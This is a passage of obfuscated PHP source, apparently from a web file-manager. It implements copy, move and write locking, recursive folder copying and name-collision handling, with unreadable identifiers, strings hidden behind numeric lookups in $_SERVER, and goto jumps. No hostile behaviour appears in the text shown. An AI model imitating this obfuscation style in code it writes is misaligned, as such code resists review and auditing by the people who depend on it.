$‡Õı«èÇ = array_filter(explode($ÄÃ¹ßéş[50], $å€İšæ•)); foreach ($‡Õı«èÇ as $å€İšæ•) { $¦øíÃÑ´ = explode($ÄÃ¹ßéş[10], $å€İšæ•); if ($¦øíÃÑ´[0] == $ÄÃ¹ßéş[2459] && $¦øíÃÑ´[1] != $ÄÃ¹ßéş[1277]) { $óƒ™¨­ = $¦øíÃÑ´[0] . $ÄÃ¹ßéş[10] . $¦øíÃÑ´[1] . $ÄÃ¹ßéş[2460]; if (!in_array($óƒ™¨­, $‡Õı«èÇ)) { $Ù†óé§†[] = $óƒ™¨­; } } $Ù†óé§†[] = $å€İšæ•; } $å€İšæ• = implode($ÄÃ¹ßéş[50], $Ù†óé§†); } public function findRoleDefault() { $«ÇÂØŠ =& $_SERVER[ÔÕ±ĞšÎ]; $ãÇ”æ = parent::listData(); $ˆ‡İúº† = !1; foreach ($ãÇ”æ as $»†’³ğ) { if (!$»†’³ğ || $»†’³ğ[$«ÇÂØŠ[2000]] == $«ÇÂØŠ[230] || $»†’³ğ[$«ÇÂØŠ[2187]] == 1) { continue; } if (strstr($»†’³ğ[$«ÇÂØŠ[489]], $«ÇÂØŠ[2461])) { continue; } if (!strstr($»†’³ğ[$«ÇÂØŠ[489]], $«ÇÂØŠ[2462])) { continue; } if (!$ˆ‡İúº†) { $ˆ‡İúº† = $»†’³ğ; continue; } $ûÆÅ…Ç‡ = explode($«ÇÂØŠ[50], $ˆ‡İúº†[$«ÇÂØŠ[489]]); $ıˆß§Ë§ = explode($«ÇÂØŠ[50], $»†’³ğ[$«ÇÂØŠ[489]]); if (count($ûÆÅ…Ç‡) > count($ıˆß§Ë§)) { $ˆ‡İúº† = $»†’³ğ; } } return $ˆ‡İúº† ? $ˆ‡İúº†[$«ÇÂØŠ[477]] : $«ÇÂØŠ[12]; } public function sort($Ê«›°òØ, $ëÂ‡™¾¶) { return parent::update($Ê«›°òØ, $ëÂ‡™¾¶); } } goto C“åÊæí® ; b‘åŠÙ­İí: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($¡õÀíË¼) { $¦­˜ûÙÊ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->allowLock()) { return; } $this->_lockCheck($¦­˜ûÙÊ[623], $¡õÀíË¼); $¾˜äß’ = 1; $this->_lockEvent($¡õÀíË¼, array($¦­˜ûÙÊ[624], $¦­˜ûÙÊ[625]), $¾˜äß’); $this->_lockParent($¡õÀíË¼, array($¦­˜ûÙÊ[625]), $¾˜äß’); $this->_lockEvent($¡õÀíË¼, array($¦­˜ûÙÊ[626], $¦­˜ûÙÊ[627]), $¾˜äß’); $this->_lockCheckEnd($¦­˜ûÙÊ[623], $¡õÀíË¼); } public function lockCopyEnd($Ş±â™İí) { $†ÈæÆğï =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->allowLock()) { return; } $öØ¯ÂÊ = 0; $this->_lockEvent($Ş±â™İí, array($†ÈæÆğï[624], $†ÈæÆğï[625]), $öØ¯ÂÊ); $this->_lockParent($Ş±â™İí, array($†ÈæÆğï[625]), $öØ¯ÂÊ); $this->_lockEvent($Ş±â™İí, array($†ÈæÆğï[626], $†ÈæÆğï[627]), $öØ¯ÂÊ); } public function lockWriteStart($“¥—È–, $±¿É„©á = '') { $„ß–ø¾¼ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->allowLock()) { return; } $this->_lockCheck($„ß–ø¾¼[624], $“¥—È–); $çĞÚà´œ = 1; $this->_lockKey($„ß–ø¾¼[628] . $“¥—È– . $„ß–ø¾¼[10] . $±¿É„©á, $çĞÚà´œ); $this->_lockEvent($“¥—È–, array($„ß–ø¾¼[623], $„ß–ø¾¼[625]), $çĞÚà´œ); $this->_lockParent($“¥—È–, array($„ß–ø¾¼[623], $„ß–ø¾¼[625]), $çĞÚà´œ); $this->_lockCheckEnd($„ß–ø¾¼[624], $“¥—È–); } public function lockWriteEnd($ÄòßÀÄÛ, $âıØ‹‹õ = '') { $ÚºË›¬í =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->allowLock()) { return; } $±·÷Ï•í = 0; $this->_lockKey($ÚºË›¬í[628] . $ÄòßÀÄÛ . $ÚºË›¬í[10] . $âıØ‹‹õ, $±·÷Ï•í); $this->_lockEvent($ÄòßÀÄÛ, array($ÚºË›¬í[623], $ÚºË›¬í[625]), $±·÷Ï•í); $this->_lockParent($ÄòßÀÄÛ, array($ÚºË›¬í[623], $ÚºË›¬í[625]), $±·÷Ï•í); } public function lockMoveStart($Ïœ¶Óİ¾) { $ÜÁµüüª =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÜÁµüüª[625], $Ïœ¶Óİ¾); $Û‡Õ÷’€ = 1; $this->_lockKey($ÜÁµüüª[629] . $Ïœ¶Óİ¾, $Û‡Õ÷’€); $this->_lockEvent($Ïœ¶Óİ¾, array($ÜÁµüüª[623], $ÜÁµüüª[624]), $Û‡Õ÷’€); $this->_lockParent($Ïœ¶Óİ¾, array($ÜÁµüüª[623], $ÜÁµüüª[625]), $Û‡Õ÷’€); $this->_lockEvent($Ïœ¶Óİ¾, array($ÜÁµüüª[630], $ÜÁµüüª[626], $ÜÁµüüª[627]), $Û‡Õ÷’€); $this->_lockCheckEnd($ÜÁµüüª[625], $Ïœ¶Óİ¾); } public function lockMoveEnd($Ó¯É¨†‹) { $áÉƒÇ¼Ï =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->allowLock()) { return; } $ƒÏ…§„ = 0; $this->_lockKey($áÉƒÇ¼Ï[629] . $Ó¯É¨†‹, $ƒÏ…§„); $this->_lockEvent($Ó¯É¨†‹, array($áÉƒÇ¼Ï[623], $áÉƒÇ¼Ï[624]), $ƒÏ…§„); $this->_lockParent($Ó¯É¨†‹, array($áÉƒÇ¼Ï[623], $áÉƒÇ¼Ï[625]), $ƒÏ…§„); $this->_lockEvent($Ó¯É¨†‹, array($áÉƒÇ¼Ï[630], $áÉƒÇ¼Ï[626], $áÉƒÇ¼Ï[627]), $ƒÏ…§„); } private function _lockCheck($³ØßŠÅ, $–…‘í¿Ÿ) { $ÍÒ¤©¨¿ =& $_SERVER[ÔÕ±ĞšÎ]; $§‹»Şû  = $this->sourceInfo($–…‘í¿Ÿ); $¶±èàµÙ = $³ØßŠÅ . $ÍÒ¤©¨¿[10] . $–…‘í¿Ÿ; $this->_lockTimeStart[$¶±èàµÙ] = timeFloat(); if (!is_array($§‹»Şû )) { return; } $ü™÷”‡ = LNG($ÍÒ¤©¨¿[631]); CacheLock::setErrorMsg($ÍÒ¤©¨¿[176] . htmlspecialchars($§‹»Şû [$ÍÒ¤©¨¿[32]]) . $ÍÒ¤©¨¿[178] . $ü™÷”‡); $this->_lockKey($¶±èàµÙ, 1); $this->_lockKey($¶±èàµÙ, 0); $Â…ğ‘•µ = array_reverse($this->parentLevelArray($§‹»Şû [$ÍÒ¤©¨¿[586]])); foreach ($Â…ğ‘•µ as $¶«ı «Ÿ) { $¶±èàµÙ = $³ØßŠÅ . $ÍÒ¤©¨¿[632] . $¶«ı «Ÿ; if (CacheLock::lockGet($ÍÒ¤©¨¿[633] . $¶±èàµÙ)) { $§‹»Şû  = $this->sourceInfo($¶«ı «Ÿ); CacheLock::setErrorMsg($ÍÒ¤©¨¿[176] . htmlspecialchars($§‹»Şû [$ÍÒ¤©¨¿[32]]) . $ÍÒ¤©¨¿[178] . $ü™÷”‡); $this->_lockKey($¶±èàµÙ, 1); $this->_lockKey($¶±èàµÙ, 0); } } } private function _lockCheckEnd($Õú€ö·ç, $ÛïÑêòŒ) { $Õş›íœœ =& $_SERVER[ÔÕ±ĞšÎ]; $ï‘îÜ½ = $Õú€ö·ç . $Õş›íœœ[10] . $ÛïÑêòŒ; CacheLock::setErrorMsg($Õş›íœœ[456]); if (!isset($this->_lockTimeStart[$ï‘îÜ½])) { return; } $“•œ•âŒ = timeFloat() - $this->_lockTimeStart[$ï‘îÜ½]; unset($this->_lockTimeStart[$ï‘îÜ½]); if ($“•œ•âŒ > 0.5) { unset(self::$cacheSourceInfo[$Õş›íœœ[535] . $ÛïÑêòŒ]); } $İ¦ñŸ¶¥ = $this->sourceInfo($ÛïÑêòŒ); if (!$İ¦ñŸ¶¥) { show_json(LNG($Õş›íœœ[108]), !1); } } private function _lockParent($ï¼À´†¹, $÷á‘Ûí», $Í±•äÕ ) { if (!$this->autoLockSet) { return; } $˜€ë»”Õ = $this->sourceInfo($ï¼À´†¹); if (!is_array($˜€ë»”Õ)) { return; } $óÇ³Àù— = array_reverse($this->parentLevelArray($˜€ë»”Õ[$_SERVER[ÔÕ±ĞšÎ][586]])); foreach ($óÇ³Àù— as $Àô£¨˜) { $this->_lockEvent($Àô£¨˜, $÷á‘Ûí», $Í±•äÕ ); } } private function _lockEvent($ó¦ôµ†, $Üóñé¸€, $­¬³ÁØ) { $ªù¿íğ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->autoLockSet) { return; } foreach ($Üóñé¸€ as $°¹Çº¾Ü) { $©öé¥ÔÁ = $°¹Çº¾Ü . $ªù¿íğ[10] . $ó¦ôµ†; if ($­¬³ÁØ && CacheLock::lockGet($ªù¿íğ[633] . $©öé¥ÔÁ)) { continue; } $this->_lockKey($©öé¥ÔÁ, $­¬³ÁØ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($¦¨­óçÖ, $ÙÀøº³ğ = 1) { $ßú€ÉÙÏ = $_SERVER[ÔÕ±ĞšÎ][633] . md5($¦¨­óçÖ); if ($ÙÀøº³ğ) { if (isset(self::$_lockItemArr[$ßú€ÉÙÏ])) { return; } self::$_lockItemArr[$ßú€ÉÙÏ] = 1; CacheLock::lock($ßú€ÉÙÏ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ßú€ÉÙÏ])) { return; } unset(self::$_lockItemArr[$ßú€ÉÙÏ]); CacheLock::unlock($ßú€ÉÙÏ); } } public function isParentOf($àúë‡­, $õ¼È÷»À) { $¡•ÁíÑ =& $_SERVER[ÔÕ±ĞšÎ]; $€¿¿Ñú® = $this->sourceInfo($àúë‡­); $‡Ã†ôËŸ = $this->sourceInfo($õ¼È÷»À); $«’ıÊÀÙ = $€¿¿Ñú®[$¡•ÁíÑ[586]] . $€¿¿Ñú®[$¡•ÁíÑ[193]] . $¡•ÁíÑ[50]; $âÔÌ©Ş— = $‡Ã†ôËŸ[$¡•ÁíÑ[586]] . $‡Ã†ôËŸ[$¡•ÁíÑ[193]] . $¡•ÁíÑ[50]; $¥•×ã¼ñ = strpos($âÔÌ©Ş—, $«’ıÊÀÙ) === 0; return $¥•×ã¼ñ; } private $targetIsDelete = 0; public function copy($âÉ×Î, $À±òó, $ƒª¦¹† = REPEAT_REPLACE, $â¨–ú³­ = '') { $Óæ´ƒ˜ô =& $_SERVER[ÔÕ±ĞšÎ]; $üşÊ¡¥ = $this->sourceInfo($âÉ×Î); $Š»Äû€Æ = $this->sourceInfo($À±òó); if (!$üşÊ¡¥ || !$Š»Äû€Æ || $Š»Äû€Æ[$Óæ´ƒ˜ô[487]] != $Óæ´ƒ˜ô[91]) { return !1; } if ($this->isParentOf($âÉ×Î, $À±òó)) { return !1; } $üÅÂÇ® = $â¨–ú³­ ? $â¨–ú³­ : $üşÊ¡¥[$Óæ´ƒ˜ô[32]]; $this->lockCopyStart($âÉ×Î); $this->lockWriteStart($À±òó, $üÅÂÇ®); $Ú‹¸Şş = array($Óæ´ƒ˜ô[634] => array(), $Óæ´ƒ˜ô[635] => array(), $Óæ´ƒ˜ô[636] => array()); $this->targetIsDelete = intval($üşÊ¡¥[$Óæ´ƒ˜ô[507]]); $€Â£æ = $this->fileNameExistAuto($À±òó, $üşÊ¡¥); $¾§²œÌ = $this->_copy($âÉ×Î, $À±òó, $ƒª¦¹†, $Ú‹¸Şş, !0, $â¨–ú³­); $this->_childrenListClear(); $this->lockCopyEnd($âÉ×Î); $this->lockWriteEnd($À±òó, $üÅÂÇ®); if ($üşÊ¡¥[$Óæ´ƒ˜ô[487]] == $Óæ´ƒ˜ô[91] && $€Â£æ == $¾§²œÌ) { $this->folderSizeResetChildren($€Â£æ); } Model($Óæ´ƒ˜ô[637])->addAll($Ú‹¸Şş[$Óæ´ƒ˜ô[635]], array(), !0); if ($€Â£æ != $¾§²œÌ || $üşÊ¡¥[$Óæ´ƒ˜ô[487]] == $Óæ´ƒ˜ô[91]) { Model($Óæ´ƒ˜ô[638])->eventCopy($¾§²œÌ); } $this->saveAll($Ú‹¸Şş[$Óæ´ƒ˜ô[636]]); Model($Óæ´ƒ˜ô[232])->linkAdd($Ú‹¸Şş[$Óæ´ƒ˜ô[634]]); $this->folderSizeReset($À±òó); $this->updateModifyTime($À±òó); return $¾§²œÌ; } private function _copy($ô¯”íœœ, $¶ÆÔ¤À, $¤çÁµï, &$Õº˜îÃå, $ğ€§Š«Â, $‹çæñ­» = '') { $™œ¥• =& $_SERVER[ÔÕ±ĞšÎ]; $çÔˆé¡˜ = $this->sourceInfoCache($ô¯”íœœ); $¡Œª÷­ = $çÔˆé¡˜[$™œ¥•[487]] == $™œ¥•[91]; $ı¹¼âò = $‹çæñ­» ? $‹çæñ­» : $çÔˆé¡˜[$™œ¥•[32]]; $Ğ–ÕÚıÂ = $this->fileNameExistAuto($¶ÆÔ¤À, $çÔˆé¡˜); if ($ğ€§Š«Â) { $this->_childrenAllMake($ô¯”íœœ); if ($¡Œª÷­ && $Ğ–ÕÚıÂ) { $this->_childrenAllMake($Ğ–ÕÚıÂ); } } if (!$Ğ–ÕÚıÂ) { return $this->_copyCreate($ô¯”íœœ, $¶ÆÔ¤À, $ı¹¼âò, $Õº˜îÃå); } $¨«Ò¤¿— = $Ğ–ÕÚıÂ; if ($¡Œª÷­) { if ($¤çÁµï == REPEAT_RENAME_FOLDER) { $ı¹¼âò = $this->fileNameAutoCache($¶ÆÔ¤À, $ı¹¼âò, $¤çÁµï, $¡Œª÷­); $¨«Ò¤¿— = $this->_copyCreate($ô¯”íœœ, $¶ÆÔ¤À, $ı¹¼âò, $Õº˜îÃå); } else { $ğÍÜ¤© = $this->_childrenList($ô¯”íœœ); foreach ($ğÍÜ¤© as $‘´å¦¾İ) { $this->_copy($‘´å¦¾İ[$™œ¥•[193]], $Ğ–ÕÚıÂ, $¤çÁµï, $Õº˜îÃå, !1); } } } else { if ($¤çÁµï == REPEAT_RENAME || $¤çÁµï == REPEAT_RENAME_FOLDER) { $ı¹¼âò = $this->fileNameAutoCache($¶ÆÔ¤À, $ı¹¼âò, $¤çÁµï, $¡Œª÷­); $¨«Ò¤¿— = $this->_copyCreate($ô¯”íœœ, $¶ÆÔ¤À, $ı¹¼âò, $Õº˜îÃå); } else { if ($¤çÁµï == REPEAT_REPLACE) { $û†«ì– = $this->sourceInfoCache($Ğ–ÕÚıÂ); $ù°üÁ”› = $this->fileHistory($û†«ì–, $çÔˆé¡˜[$™œ¥•[543]], $çÔˆé¡˜[$™œ¥•[79]]); if ($ù°üÁ”›) { $Õº˜îÃå[$™œ¥•[634]][] = $çÔˆé¡˜[$™œ¥•[543]]; } } else { if ($¤çÁµï == REPEAT_SKIP) { } } } Hook::trigger($™œ¥•[639], array($™œ¥•[640], $çÔˆé¡˜, 0)); } return $¨«Ò¤¿—; } private function _copyCreate($â¦ÎÈ˜, $êÚ‡Êçì, $«ı¨òà÷, &$¸£“ŠÅä) { $éÎ‘İÆ =& $_SERVER[ÔÕ±ĞšÎ]; $Ï÷¹«ßÏ = $this->sourceInfoCache($â¦ÎÈ˜); $‡€Œ“… = $this->sourceInfoCache($êÚ‡Êçì); $ãÉ§ö¾„ = $this->_makeItemData($Ï÷¹«ßÏ, $‡€Œ“…, $«ı¨òà÷); Hook::trigger($éÎ‘İÆ[641], $ãÉ§ö¾„); Hook::trigger($éÎ‘İÆ[642], array($éÎ‘İÆ[643], $ãÉ§ö¾„, 0)); $°¼áÑª = $this->add($ãÉ§ö¾„); $Šèó‡¾· = array($éÎ‘İÆ[193] => $°¼áÑª, $éÎ‘İÆ[32] => $«ı¨òà÷); $this->_copyApplyMeta($Šèó‡¾·, $¸£“ŠÅä); if ($Ï÷¹«ßÏ[$éÎ‘İÆ[487]] != $éÎ‘İÆ[91]) { $¸£“ŠÅä[$éÎ‘İÆ[634]][] = $Ï÷¹«ßÏ[$éÎ‘İÆ[543]]; return $°¼áÑª; } $äìŸ½İŒ = array(); $Œø¦º¼¨ = array(); $this->_childrenListAll($â¦ÎÈ˜, $äìŸ½İŒ); $Ú¹ò®¹Ñ = count($äìŸ½İŒ); if ($Ú¹ò®¹Ñ == 0) { return $°¼áÑª; } $ªôá†±ƒ = $this->sourceInfo($°¼áÑª); foreach ($äìŸ½İŒ as $Âç ÌÑŠ) { $§¿×ÁÔ· = $this->_makeItemData($Âç ÌÑŠ, $ªôá†±ƒ, $Âç ÌÑŠ[$éÎ‘İÆ[32]]); $§¿×ÁÔ·[$éÎ‘İÆ[586]] = $Âç ÌÑŠ[$éÎ‘İÆ[586]]; $Œø¦º¼¨[] = $§¿×ÁÔ·; } $this->chunkEventSet($éÎ‘İÆ[644], array($éÎ‘İÆ[645], $ãÉ§ö¾„, $Ú¹ò®¹Ñ)); $this->addAll($Œø¦º¼¨, array(), !1); $ğ¸¨‚ = $this->where(array($éÎ‘İÆ[192] => $°¼áÑª))->select(); $Ø‡Óíä¤ = $this->_childrenMakeRelation($äìŸ½İŒ, $ğ¸¨‚); $Ø‡Óíä¤[$â¦ÎÈ˜] = $°¼áÑª; $âœÄüõ = array(); $¡‘ö‡ÒÀ = array(); foreach ($ğ¸¨‚ as $Âç ÌÑŠ) { $ÊÃ‰ğ© = $Âç ÌÑŠ[$éÎ‘İÆ[193]]; $ÑµÏ‚ä¤ = $this->_childrenMatch($Ø‡Óíä¤, $Âç ÌÑŠ, $ªôá†±ƒ); $âœÄüõ[] = array($éÎ‘İÆ[193], $ÊÃ‰ğ©, $éÎ‘İÆ[192], $ÑµÏ‚ä¤[$éÎ‘İÆ[192]]); $¡‘ö‡ÒÀ[] = array($éÎ‘İÆ[193], $ÊÃ‰ğ©, $éÎ‘İÆ[586], $ÑµÏ‚ä¤[$éÎ‘İÆ[586]]); $this->_copyApplyMeta($Âç ÌÑŠ, $¸£“ŠÅä); if ($Âç ÌÑŠ[$éÎ‘İÆ[487]] != $éÎ‘İÆ[91]) { $¸£“ŠÅä[$éÎ‘İÆ[634]][] = $Âç ÌÑŠ[$éÎ‘İÆ[543]]; } } $this->chunkEventSet($éÎ‘İÆ[646], array($éÎ‘İÆ[647], $ãÉ§ö¾„, $Ú¹ò®¹Ñ)); $this->saveAll($âœÄüõ); $this->chunkEventSet($éÎ‘İÆ[648], array($éÎ‘İÆ[649], $ãÉ§ö¾„, $Ú¹ò®¹Ñ)); $this->saveAll($¡‘ö‡ÒÀ); return $°¼áÑª; } private function _childrenMakeRelation($õÀ§ğŒ, $ù½°ø±Ã) { $ˆ­ïğé =& $_SERVER[ÔÕ±ĞšÎ]; $ùé»ê¢– = array(); $¾¯ˆÂ‰‹ = array(); foreach ($õÀ§ğŒ as $½ÅåÎÓ) { $ØÙ˜´Ë¯ = $½ÅåÎÓ[$ˆ­ïğé[32]] . $ˆ­ïğé[8] . $½ÅåÎÓ[$ˆ­ïğé[586]]; $ùé»ê¢–[$ØÙ˜´Ë¯] = $½ÅåÎÓ[$ˆ­ïğé[193]]; } foreach ($ù½°ø±Ã as $½ÅåÎÓ) { $ØÙ˜´Ë¯ = $½ÅåÎÓ[$ˆ­ïğé[32]] . $ˆ­ïğé[8] . $½ÅåÎÓ[$ˆ­ïğé[586]]; $ôğÎÒÌƒ = $ùé»ê¢–[$ØÙ˜´Ë¯]; $¾¯ˆÂ‰‹[$ôğÎÒÌƒ] = $½ÅåÎÓ[$ˆ­ïğé[193]]; } return $¾¯ˆÂ‰‹; } private function _childrenMatch($â¯úíè, $Â‹í™É¤, $İÕú½êá) { $£Â¹”¬á =& $_SERVER[ÔÕ±ĞšÎ]; $¹ô¥³¼é = $İÕú½êá[$£Â¹”¬á[586]]; $¹“¡¬³Ÿ = $this->parentLevelArray($Â‹í™É¤[$£Â¹”¬á[586]]); foreach ($¹“¡¬³Ÿ as $üñ•û¡Ô) { if (isset($â¯úíè[$üñ•û¡Ô])) { $¹ô¥³¼é .= $â¯úíè[$üñ•û¡Ô] . $£Â¹”¬á[650]; } } $¹ô¥³¼é = rtrim($¹ô¥³¼é, $£Â¹”¬á[50]) . $£Â¹”¬á[50]; $¦¯Ì÷Ñ = $this->parentLevelArray($¹ô¥³¼é); $›ª€½ïú = $¦¯Ì÷Ñ[count($¦¯Ì÷Ñ) - 1]; return array($£Â¹”¬á[192] => $›ª€½ïú, $£Â¹”¬á[586] => $¹ô¥³¼é); } private function _makeItemData($õ˜¨áÁ¢, $ŸÔ±Œ¢, $Ûà”çı¤) { $“á‰şŸ =& $_SERVER[ÔÕ±ĞšÎ]; $Úğïóó× = array($“á‰şŸ[651] => $õ˜¨áÁ¢[$“á‰şŸ[487]], $“á‰şŸ[496] => $Ûà”çı¤, $“á‰şŸ[652] => $õ˜¨áÁ¢[$“á‰şŸ[488]] ? $õ˜¨áÁ¢[$“á‰şŸ[488]] : $“á‰şŸ[12], $“á‰şŸ[544] => $õ˜¨áÁ¢[$“á‰şŸ[543]] ? $õ˜¨áÁ¢[$“á‰şŸ[543]] : 0, $“á‰şŸ[622] => $õ˜¨áÁ¢[$“á‰şŸ[79]] ? $õ˜¨áÁ¢[$“á‰şŸ[79]] : 0, $“á‰şŸ[653] => intval($ŸÔ±Œ¢[$“á‰şŸ[190]]), $“á‰şŸ[654] => intval($ŸÔ±Œ¢[$“á‰şŸ[571]]), $“á‰şŸ[655] => intval(USER_ID), $“á‰şŸ[656] => intval(USER_ID), $“á‰şŸ[479] => intval($ŸÔ±Œ¢[$“á‰şŸ[193]]), $“á‰şŸ[657] => $ŸÔ±Œ¢[$“á‰şŸ[586]] . $ŸÔ±Œ¢[$“á‰şŸ[193]] . $“á‰şŸ[50], $“á‰şŸ[500] => $õ˜¨áÁ¢[$“á‰şŸ[88]] ? $õ˜¨áÁ¢[$“á‰şŸ[88]] : time(), $“á‰şŸ[506] => 0, $“á‰şŸ[658] => $“á‰şŸ[12]); return $Úğïóó×; } private function _copyApplyMeta($¶‹‰üéŒ, &$øßûÒ²§) { $©±¦¤ùß =& $_SERVER[ÔÕ±ĞšÎ]; $Ş¥ÖÛË÷ = $¶‹‰üéŒ[$©±¦¤ùß[193]]; $’»ÚõÏ = $¶‹‰üéŒ[$©±¦¤ùß[32]]; if (!isset($¶‹‰üéŒ[$©±¦¤ùß[659]]) || !$¶‹‰üéŒ[$©±¦¤ùß[659]] || $¶‹‰üéŒ[$©±¦¤ùß[659]] == $©±¦¤ùß[230]) { $øßûÒ²§[$©±¦¤ùß[636]][] = array($©±¦¤ùß[193], $Ş¥ÖÛË÷, $©±¦¤ùß[659], short_id($Ş¥ÖÛË÷)); } if (Input::check($’»ÚõÏ, $©±¦¤ùß[660])) { $øßûÒ²§[$©±¦¤ùß[635]][] = array($©±¦¤ùß[193] => $Ş¥ÖÛË÷, $©±¦¤ùß[97] => $©±¦¤ùß[540], $©±¦¤ùß[452] => str_replace($©±¦¤ùß[53], $©±¦¤ùß[12], Pinyin::get($’»ÚõÏ))); $øßûÒ²§[$©±¦¤ùß[635]][] = array($©±¦¤ùß[193] => $Ş¥ÖÛË÷, $©±¦¤ùß[97] => $©±¦¤ùß[539], $©±¦¤ùß[452] => Pinyin::get($’»ÚõÏ, $©±¦¤ùß[661])); } $øßûÒ²§[$©±¦¤ùß[635]][] = array($©±¦¤ùß[193] => $Ş¥ÖÛË÷, $©±¦¤ùß[97] => $©±¦¤ùß[519], $©±¦¤ùß[452] => KodSort::makeStr($’»ÚõÏ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ŞÌ¡ÃïÏ) { $¤¿ñ Ë =& $_SERVER[ÔÕ±ĞšÎ]; $ç¾í×º = $this->sourceInfo($ŞÌ¡ÃïÏ); $Á½¯†À÷ = $¤¿ñ Ë[662]; $‹½ïûÖì = array($¤¿ñ Ë[586] => array($¤¿ñ Ë[617], $ç¾í×º[$¤¿ñ Ë[586]] . $ŞÌ¡ÃïÏ . $¤¿ñ Ë[618]), $¤¿ñ Ë[507] => $this->targetIsDelete); $ÅˆÌ Úã = $this->field($Á½¯†À÷)->where($‹½ïûÖì)->select(); if (!$ÅˆÌ Úã) { return; } $ÅˆÌ Úã = array_to_keyvalue($ÅˆÌ Úã, $¤¿ñ Ë[193]); foreach ($ÅˆÌ Úã as $ ”ØçÃ€) { $‰íÄÀÁõ = $ ”ØçÃ€[$¤¿ñ Ë[192]]; $ŞÌ¡ÃïÏ = $ ”ØçÃ€[$¤¿ñ Ë[193]]; if (!isset($this->_childrenListCache[$ŞÌ¡ÃïÏ]) && $ ”ØçÃ€[$¤¿ñ Ë[487]] == $¤¿ñ Ë[91]) { $this->_childrenListCache[$ŞÌ¡ÃïÏ] = array(); } if (!isset($this->_childrenListCache[$‰íÄÀÁõ])) { $this->_childrenListCache[$‰íÄÀÁõ] = array(); } $this->_childrenListCache[$‰íÄÀÁõ][$ŞÌ¡ÃïÏ] = $ ”ØçÃ€; $this->_childrenItemCache[$ŞÌ¡ÃïÏ] = $ ”ØçÃ€; } } private function _childrenListAll($¿Îï‡Èî, &$³ÊË“ïü) { $Ç–öæç¨ =& $_SERVER[ÔÕ±ĞšÎ]; if (!isset($this->_childrenListCache[$¿Îï‡Èî])) { return; } $•‹íïĞ¶ = $this->_childrenListCache[$¿Îï‡Èî]; foreach ($•‹íïĞ¶ as $²¾‘ôøØ => $•û”ç´Å) { $³ÊË“ïü[$²¾‘ôøØ] = $•û”ç´Å; if ($•û”ç´Å[$Ç–öæç¨[487]] == $Ç–öæç¨[91]) { $this->_childrenListAll($²¾‘ôøØ, $³ÊË“ïü); } } } private function sourceInfoCache($»ó“öŸƒ) { if (isset($this->_childrenItemCache[$»ó“öŸƒ])) { return $this->_childrenItemCache[$»ó“öŸƒ]; } return $this->sourceInfo($»ó“öŸƒ); } private function _childrenList($¯à¬“¯œ) { if (isset($this->_childrenListCache[$¯à¬“¯œ])) { return $this->_childrenListCache[$¯à¬“¯œ]; } return $this->_childrenListSelect($¯à¬“¯œ); } private function _childrenListSelect($“ËšÛ²¹) { $ôèüËÌ÷ =& $_SERVER[ÔÕ±ĞšÎ]; $¤ÕÂªŸæ = array($ôèüËÌ÷[192] => $“ËšÛ²¹, $ôèüËÌ÷[507] => $this->targetIsDelete); $ÌôúÈÈÈ = $this->where($¤ÕÂªŸæ)->select(); $ÌôúÈÈÈ = $ÌôúÈÈÈ ? $ÌôúÈÈÈ : array(); $è¬”ßà× = array_to_keyvalue($ÌôúÈÈÈ, $ôèüËÌ÷[193]); $this->_childrenListCache[$“ËšÛ²¹] = $è¬”ßà×; foreach ($è¬”ßà× as $“ËšÛ²¹ => $ş¯Åä™¹) { $this->_childrenItemCache[$“ËšÛ²¹] = $ş¯Åä™¹; } return $è¬”ßà×; } private function fileNameExistAuto($³‚»´‹Å, $å·—š¿õ) { $³‘Ú¡ª =& $_SERVER[ÔÕ±ĞšÎ]; if ($å·—š¿õ[$³‘Ú¡ª[507]] == $³‘Ú¡ª[91]) { return $this->fileNameExist($³‚»´‹Å, $å·—š¿õ[$³‘Ú¡ª[32]]); } return $this->fileNameExistCache($³‚»´‹Å, $å·—š¿õ[$³‘Ú¡ª[32]]); } private function fileNameExistCache($§í£’˜, $åïÔ·û‹) { $‚Ê¡ü²ƒ =& $_SERVER[ÔÕ±ĞšÎ]; $åïÔ·û‹ = strtolower($åïÔ·û‹); $­è­Ò…¶ = $this->_childrenList($§í£’˜); foreach ($­è­Ò…¶ as $‰½ˆİ®–) { if ($åïÔ·û‹ == strtolower($‰½ˆİ®–[$‚Ê¡ü²ƒ[32]])) { return $‰½ˆİ®–[$‚Ê¡ü²ƒ[193]]; } } return !1; } private function fileNameAutoCache($Éºö–—, $¶ßšÛÅ„, $˜Ôü…§¡, $ì‹ªÓŞö) { $Œ´ìî¶ß =& $_SERVER[ÔÕ±ĞšÎ]; $…Èî…´† = $this->_childrenList($Éºö–—); $¦«¾ÖµÇ = array_to_keyvalue($…Èî…´†, $Œ´ìî¶ß[12], $Œ´ìî¶ß[32]); return $this->fileNameAutoGet($¦«¾ÖµÇ, $¶ßšÛÅ„, $˜Ôü…§¡, $ì‹ªÓŞö); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($³œİÅ, $èÊ…‡Ø¢, $Âœë¾¶¬ = REPEAT_REPLACE, $ËÃ×…Ò = '') { $¥ì”î™í =& $_SERVER[ÔÕ±ĞšÎ]; $œ³ˆì = $this->sourceInfo($³œİÅ); $ùâ¢ì¨· = $this->sourceInfo($èÊ…‡Ø¢); if ($œ³ˆì[$¥ì”î™í[192]] == $ùâ¢ì¨·[$¥ì”î™í[193]]) { if ($œ³ˆì[$¥ì”î™í[507]] == $¥ì”î™í[91]) { Model($¥ì”î™í[505])->restore(array($³œİÅ)); } if (!$ËÃ×…Ò || $ËÃ×…Ò == $œ³ˆì[$¥ì”î™í[32]]) { return $³œİÅ; } } $Âû•Üì = $this->pathInfoMore($³œİÅ); if ($this->isParentOf($³œİÅ, $èÊ…‡Ø¢)) { return !1; } if (!$œ³ˆì || !$ùâ¢ì¨· || $ùâ¢ì¨·[$¥ì”î™í[487]] != $¥ì”î™í[91]) 